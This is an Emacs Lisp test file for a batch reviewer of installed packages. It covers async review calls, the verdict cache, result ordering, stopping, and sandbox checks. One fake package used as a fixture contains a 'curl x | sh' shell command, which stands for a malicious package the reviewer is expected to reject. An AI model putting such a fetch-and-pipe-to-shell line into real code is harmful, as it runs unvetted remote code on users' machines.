;;; test-package-review-ui.el --- batch review of installed packages -*- lexical-binding: t; -*-

;;; Commentary:
;; The async driver (`efrit-package-review-run-async') over a stubbed
;; `efrit-api-request-async', the verdict cache round trip, and the
;; list: order worst first, cached rows skipped, stop honoured.  The
;; canned responses and fake packages come from test-package-review.

;;; Code:

(require 'ert)
(require 'cl-lib)
(require 'efrit-test-package-review-helpers)
(require 'efrit-package-review-ui)

(defvar test-pru--queue nil)
(defvar test-pru--pending nil
  "Deliveries not yet made: (CALLBACK ERROR-CALLBACK . RESPONSE), oldest first.")
(defvar test-pru--sent 0)

(defun test-pru--deliver ()
  "Deliver every pending answer, and the answers their callbacks queue, in order.
Like a transport: the callback runs after the call that sent the request
returned, never inside it."
  (while test-pru--pending
    (let* ((d (pop test-pru--pending))
           (r (cddr d)))
      (cond ((null r) (funcall (cadr d) "no more canned responses"))
            ((stringp r) (funcall (cadr d) r))
            (t (funcall (car d) r))))))

(defmacro test-pru--with-async (responses &rest body)
  "Run BODY with `efrit-api-request-async' answering RESPONSES in order.
Answers are delivered by `test-pru--deliver', which BODY calls when it
wants the reviews to progress; `test-pru--sent' counts the requests."
  (declare (indent 1))
  `(let ((test-pru--queue ,responses) (test-pru--pending nil) (test-pru--sent 0))
     (cl-letf (((symbol-function 'efrit-api-request-async)
                (lambda (_req callback &optional error-callback)
                  (cl-incf test-pru--sent)
                  (setq test-pru--pending
                        (append test-pru--pending
                                (list (cons callback (cons error-callback (pop test-pru--queue)))))))))
       ,@body)))

(defmacro test-pru--fresh (&rest body)
  "Run BODY with the batch state and the cache empty, in a temp data directory."
  (declare (indent 0))
  `(let* ((root (file-name-as-directory (make-temp-file "efrit-pru-" t)))
          (efrit-data-directory (expand-file-name "data" root))
          (efrit-project-root root)
          (efrit-package-review-ui--cache nil)
          (efrit-package-review-ui--rows nil)
          (efrit-package-review-ui--queue nil)
          (efrit-package-review-ui--current nil)
          (efrit-package-review-ui--stopped nil)
          (efrit-package-review-model "batch-reviewer"))
     (unwind-protect (progn ,@body)
       (when-let* ((b (get-buffer efrit-package-review-ui--buffer))) (kill-buffer b))
       (delete-directory root t))))

(defconst test-pru--reject
  "{\"verdict\":\"reject\",\"summary\":\"pipes curl to sh\",\"findings\":[{\"severity\":\"high\",\"file\":\"bad.el\",\"line\":1,\"note\":\"curl | sh\"}],\"saw_everything\":true}")

(ert-deftest test-package-review-ui-async-driver-matches-sync ()
  "The async loop answers tool calls and ends with the same verdict shape."
  (test-pru--fresh
    (let* ((pkg (test-pr--fake-package root "baz" "1.0" '(("baz.el" . "(provide 'baz)\n"))))
           (info (efrit-package-review-gather (cdr pkg) (car pkg) nil))
           (got nil))
      (test-pru--with-async (list (test-pr--tool-response "t1" "baz.el")
                                  (test-pr--text-response test-pr--approve))
        (efrit-package-review-run-async info (lambda (v) (setq got v)))
        (should-not got)
        (test-pru--deliver)
        (should (= test-pru--sent 2)))
      (should (eq (plist-get got :verdict) 'approve))
      (should (equal (plist-get got :reads) '("baz.el")))
      ;; a transport failure is a failed verdict, not a signal
      (test-pru--with-async (list "connection refused")
        (efrit-package-review-run-async info (lambda (v) (setq got v)))
        (test-pru--deliver))
      (should (eq (plist-get got :verdict) 'error))
      (should (string-match-p "connection refused" (plist-get got :summary)))
      ;; cancel: the loop stops after the answer in flight
      (test-pru--with-async (list (test-pr--tool-response "t1" "baz.el")
                                  (test-pr--tool-response "t2" "baz.el")
                                  (test-pr--text-response test-pr--approve))
        (let ((state (efrit-package-review-run-async info (lambda (v) (setq got v)))))
          (efrit-package-review-cancel state)
          (test-pru--deliver)
          (should (= test-pru--sent 1))
          (should (plist-get got :cancelled)))))))

(ert-deftest test-package-review-ui-cache-round-trip ()
  (test-pru--fresh
    (let ((v (list :verdict 'reject :summary "bad" :saw-everything t :model "m" :reads '("a.el")
                   :findings (list (list :severity 'high :file "a.el" :line 3 :note "curl | sh")
                                   (list :severity 'info :file nil :line nil :note "uses url")))))
      (efrit-package-review-ui--cache-put 'foo "1.0" v)
      (should (= 0 (logand (file-modes (efrit-package-review-ui--cache-file)) #o077)))
      ;; non-ASCII in a verdict: written as UTF-8 without a coding
      ;; prompt (json-serialize gives unibyte bytes), read back intact
      (cl-letf (((symbol-function 'select-safe-coding-system)
                 (lambda (&rest _) (error "coding system prompt reached"))))
        (efrit-package-review-ui--cache-put 'dash "1.0" (list :verdict 'approve :summary "a \u2014 b \u00D8 \U0001F600" :saw-everything t)))
      (setq efrit-package-review-ui--cache nil)
      (should (equal (plist-get (efrit-package-review-ui--cached 'dash "1.0") :summary) "a \u2014 b \u00D8 \U0001F600"))
      (setq efrit-package-review-ui--cache nil)
      (let ((back (efrit-package-review-ui--cached 'foo "1.0")))
        (should (eq (plist-get back :verdict) 'reject))
        (should (plist-get back :saw-everything))
        (should (equal (plist-get back :reads) '("a.el")))
        (should (equal (plist-get back :findings) (plist-get v :findings))))
      (should-not (efrit-package-review-ui--cached 'foo "1.1"))
      ;; a failed review is not cached
      (efrit-package-review-ui--cache-put 'bar "1.0" (list :verdict 'error :summary "boom"))
      (should-not (efrit-package-review-ui--cached 'bar "1.0")))))

(ert-deftest test-package-review-ui-batch-orders-and-caches ()
  "Two packages: the rejected one sorts first; a second run reads the cache."
  (test-pru--fresh
    (let* ((good (test-pr--fake-package root "good" "1.0" '(("good.el" . "(provide 'good)\n"))))
           (bad (test-pr--fake-package root "bad" "2.0" '(("bad.el" . "(shell-command \"curl x | sh\")\n"))))
           (package-alist (list (list 'good (cdr good)) (list 'bad (cdr bad)))))
      (cl-letf (((symbol-function 'pop-to-buffer) (lambda (b &rest _) (set-buffer b))))
        ;; reviewed in name order: bad gets the reject, good the approve
        (test-pru--with-async (list (test-pr--text-response test-pru--reject)
                                    (test-pr--text-response test-pr--approve))
          (efrit-review-all-packages)
          (should (eq (plist-get (efrit-package-review-ui--row 'bad) :status) 'running))
          (test-pru--deliver)
          (should (= test-pru--sent 2)))
        (with-current-buffer efrit-package-review-ui--buffer
          (should (derived-mode-p 'efrit-package-review-ui-mode))
          (goto-char (point-min))
          (should (eq (tabulated-list-get-id) 'bad))
          (should (string-match-p "1 high" (aref (tabulated-list-get-entry) 3)))
          (forward-line 1)
          (should (eq (tabulated-list-get-id) 'good))
          (should (equal (efrit-package-review-ui--totals) "1 rejected, 1 approved, 0 failed"))
          ;; RET shows the report with the findings
          (cl-letf (((symbol-function 'efrit-show-popup)
                     (lambda (_name insert) (with-temp-buffer (funcall insert) (buffer-string)))))
            (goto-char (point-min))
            (should (string-match-p "curl | sh" (efrit-package-review-ui-show)))))
        ;; second run: nothing is sent, both rows come from the cache
        (setq efrit-package-review-ui--rows nil)
        (test-pru--with-async nil
          (efrit-review-all-packages)
          (test-pru--deliver)
          (should (= test-pru--sent 0)))
        (should (cl-every (lambda (r) (eq (plist-get (cdr r) :status) 'cached))
                          efrit-package-review-ui--rows))
        ;; forced: both are sent again
        (test-pru--with-async (list (test-pr--text-response test-pr--approve)
                                    (test-pr--text-response test-pr--approve))
          (efrit-review-all-packages t)
          (test-pru--deliver)
          (should (= test-pru--sent 2)))
        (should (cl-every (lambda (r) (eq (plist-get (cdr r) :status) 'done))
                          efrit-package-review-ui--rows))))))

(ert-deftest test-package-review-ui-stop-leaves-queue ()
  (test-pru--fresh
    (let* ((a (test-pr--fake-package root "aa" "1.0" '(("aa.el" . "1\n"))))
           (b (test-pr--fake-package root "bb" "1.0" '(("bb.el" . "1\n"))))
           (package-alist (list (list 'aa (cdr a)) (list 'bb (cdr b)))))
      (cl-letf (((symbol-function 'pop-to-buffer) (lambda (buf &rest _) (set-buffer buf))))
        (test-pru--with-async (list (test-pr--text-response test-pr--approve))
          (efrit-review-all-packages)
          ;; stop while the first review is in flight: its answer still lands
          (efrit-package-review-ui-stop)
          (test-pru--deliver)
          (should (= test-pru--sent 1)))
        (should (eq (plist-get (efrit-package-review-ui--row 'aa) :status) 'done))
        (should (eq (plist-get (efrit-package-review-ui--row 'bb) :status) 'pending))
        (should (equal efrit-package-review-ui--queue '(bb)))))))

(ert-deftest test-package-review-ui-queue-survives-a-failed-callback ()
  "A cache write that signals must not wedge the queue, and a stale
`current' with no running row must not stop a new start."
  (test-pru--fresh
    (let* ((a (test-pr--fake-package root "aa" "1.0" '(("aa.el" . "1\n"))))
           (b (test-pr--fake-package root "bb" "1.0" '(("bb.el" . "1\n"))))
           (package-alist (list (list 'aa (cdr a)) (list 'bb (cdr b)))))
      (cl-letf (((symbol-function 'pop-to-buffer) (lambda (buf &rest _) (set-buffer buf)))
                ((symbol-function 'efrit-package-review-ui--cache-put)
                 (lambda (&rest _) (error "disk full"))))
        (test-pru--with-async (list (test-pr--text-response test-pr--approve)
                                    (test-pr--text-response test-pr--approve))
          (efrit-review-all-packages)
          (test-pru--deliver)
          (should (= test-pru--sent 2))))
      (should (eq (plist-get (efrit-package-review-ui--row 'aa) :status) 'done))
      (should (eq (plist-get (efrit-package-review-ui--row 'bb) :status) 'done))
      (should-not efrit-package-review-ui--current)
      ;; a leftover current (as after a reload mid-review) with no running row
      (setq efrit-package-review-ui--current 'stale)
      (cl-letf (((symbol-function 'pop-to-buffer) (lambda (buf &rest _) (set-buffer buf))))
        (test-pru--with-async (list (test-pr--text-response test-pr--approve)
                                    (test-pr--text-response test-pr--approve))
          (efrit-review-all-packages t)
          (should (eq (plist-get (efrit-package-review-ui--row 'aa) :status) 'running))
          (test-pru--deliver)
          (should (= test-pru--sent 2)))))))

(ert-deftest test-package-review-ui-eval-cannot-run-it ()
  (require 'efrit-sandbox-eval)
  (should (efrit-sandbox-eval-inspect '(efrit-review-all-packages)))
  (should (efrit-sandbox-eval-inspect '(efrit-package-review-ui--cache-put 'x "1" nil))))

(provide 'test-package-review-ui)
;;; test-package-review-ui.el ends here
